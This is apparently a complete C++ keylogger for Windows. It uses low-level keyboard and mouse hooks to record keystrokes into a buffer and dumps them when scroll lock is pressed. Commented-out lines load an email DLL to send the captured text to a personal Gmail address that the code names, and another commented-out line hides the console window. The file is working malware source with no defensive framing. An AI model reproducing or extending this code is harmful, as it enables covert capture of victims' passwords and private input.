#include <iostream>
#include <string>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>

HHOOK keyboardHook;
HHOOK mouseHook;

std::string info = "";
bool shift = false; // 160 | 161
bool capslk = false; // 20
bool numlk = true; // 144

// __declspec(dllimport) extern void SendEmail(std::string from, std::string to, std::string subject, std::string body);
typedef void(__cdecl *SendEmail)(std::string from, std::string to, std::string subject, std::string body);
// typedef bool(__cdecl *saySomething)();

void SaveInfo() 
{
    // const TCHAR* pemodule = _T("email.dll");
    // HMODULE lib = LoadLibrary(pemodule);
    // auto pSendEmail = (SendEmail)GetProcAddress(lib, "SendEmail");
    // pSendEmail("bozidarkabahcijski@gmail.com", "bozidarkabahcijski@gmail.com", "Logged Info", info);

    std::cout << "-START-\n" << info << "-END-\n";
    exit(0);
}

void Hook(int nCode, WPARAM wParam, LPARAM lParam, bool isKeyboard) 
{
    // scroll lock
    if (wParam == 519) { SaveInfo(); return; }

    // wParam - 256 == key pressed, 257 == key released
    if (!isKeyboard) { return; }
    KBDLLHOOKSTRUCT keyboard = *((KBDLLHOOKSTRUCT*)lParam);
    if (keyboard.vkCode == 160 || keyboard.vkCode == 161) { shift = !shift; }

    printf("%i\n", keyboard.vkCode);

    if (wParam != 256) { return; }
    if (keyboard.vkCode == 20) { capslk = !capslk; }
    if (keyboard.vkCode == 144) { numlk = !numlk; }

    bool useCaps = (!capslk && shift) || (capslk && !shift);

    if (keyboard.vkCode >= 96 && keyboard.vkCode <= 105) { if (!numlk) { return; } keyboard.vkCode -= 0x30; }
    if (keyboard.vkCode >= 65 && keyboard.vkCode <= 90 && !useCaps) { keyboard.vkCode += 32; }

    if (keyboard.vkCode == 48) { keyboard.vkCode = (shift) ? ')' : '0'; }
    if (keyboard.vkCode == 49) { keyboard.vkCode = (shift) ? '!' : '1'; }
    if (keyboard.vkCode == 50) { keyboard.vkCode = (shift) ? '@' : '2'; }
    if (keyboard.vkCode == 51) { keyboard.vkCode = (shift) ? '#' : '3'; }
    if (keyboard.vkCode == 52) { keyboard.vkCode = (shift) ? '$' : '4'; }
    if (keyboard.vkCode == 53) { keyboard.vkCode = (shift) ? '%' : '5'; }
    if (keyboard.vkCode == 54) { keyboard.vkCode = (shift) ? '^' : '6'; }
    if (keyboard.vkCode == 55) { keyboard.vkCode = (shift) ? '&' : '7'; }
    if (keyboard.vkCode == 56) { keyboard.vkCode = (shift) ? '*' : '8'; }
    if (keyboard.vkCode == 57) { keyboard.vkCode = (shift) ? '(' : '9'; }
    if (keyboard.vkCode == 192) { keyboard.vkCode = (shift) ? '~' : '`'; }
    if (keyboard.vkCode == 188) { keyboard.vkCode = (shift) ? '<' : ','; }
    if (keyboard.vkCode == 190) { keyboard.vkCode = (shift) ? '>' : '.'; }
    if (keyboard.vkCode == 191) { keyboard.vkCode = (shift) ? '?' : '/'; }
    if (keyboard.vkCode == 186) { keyboard.vkCode = (shift) ? ':' : ';'; }
    if (keyboard.vkCode == 222) { keyboard.vkCode = (shift) ? '"' : '\''; }
    if (keyboard.vkCode == 219) { keyboard.vkCode = (shift) ? '{' : '['; }
    if (keyboard.vkCode == 221) { keyboard.vkCode = (shift) ? '}' : ']'; }
    if (keyboard.vkCode == 189) { keyboard.vkCode = (shift) ? '_' : '-'; }
    if (keyboard.vkCode == 187) { keyboard.vkCode = (shift) ? '+' : '='; }
    if (keyboard.vkCode == 226) { keyboard.vkCode = (shift) ? '|' : '\\'; }


    if (keyboard.vkCode == 0x08) { info += "\\x08"; }
    else if (keyboard.vkCode == 0x1b) { info += "\\x1b"; }
    else if (keyboard.vkCode == 0x0d) { info += "\x0a"; }
    else if (keyboard.vkCode == 0x0a || (keyboard.vkCode >= 0x20 && keyboard.vkCode <= 0x7e)) { info += keyboard.vkCode & 0xff; }
    else { return; }
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) 
{
    if (nCode == 0) { Hook(nCode, wParam, lParam, true); }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == 0) { Hook(nCode, wParam, lParam, false); }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

void MessageLoop() 
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) 
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI my_HotKey(LPVOID lpParm) 
{
    HINSTANCE hInstance = GetModuleHandle(NULL);
    if (!hInstance) hInstance = LoadLibrary((LPCSTR) lpParm); 
    if (!hInstance) return 1;
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHook, hInstance, NULL);
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHook, hInstance, NULL);
    MessageLoop();
    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
    return 0;
}

int main(int argc, char** argv) 
{
    HANDLE hThread;
    DWORD dwThread;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)my_HotKey, (LPVOID)argv[0], NULL, &dwThread);

    // ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);

    if (hThread) return WaitForSingleObject(hThread, INFINITE);
    else return 1;
}